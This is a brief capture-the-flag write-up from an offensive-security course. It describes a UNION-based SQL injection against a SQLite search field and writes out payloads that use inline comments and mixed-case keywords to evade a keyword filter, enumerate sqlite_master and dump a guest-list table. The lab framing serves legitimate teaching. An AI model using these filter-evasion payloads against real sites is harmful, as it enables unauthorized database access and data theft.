# StagePass

**Category:** web / SQL injection (UNION-based, SQLite) · **Course:** Offensive Security (PoliTo)

## Vulnerability

A search/lookup field builds a SQL query by string concatenation, letting a single-quote break out of the intended string literal and append a `UNION SELECT`. The backend is SQLite, so schema and secret-table discovery goes through `sqlite_master` / `sqlite_schema` rather than `information_schema`.

## Exploitation

Classic three-step UNION-based extraction against SQLite:

1. Find the injectable column count / confirm the injection point: `0/**/unIon/**/seLect/**/1,2,3,4,5,6,7,8,9,10,11,12--`
2. Enumerate the schema to find interesting tables: `0/**/Union/**/SeLECT/**/1,...,tbl_name/**/FRoM/**/sqlite_master/**/WHeRE/**/type='table'--`
3. Dump the CREATE statement / contents of the interesting table (`vip_guestlist`) and pull the flag column: `0/**/UNIOn/**/SELeCT/**/id,event_id,guest_name,access_note,...**/FROm/**/vip_guestlist--`

Comments (`/**/`) and mixed-case keywords were used throughout, most likely to route around a naive keyword-based WAF/filter blocking plain `UNION SELECT`.

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.

## Note

Only the solution notes were preserved for this challenge (no app source retained).
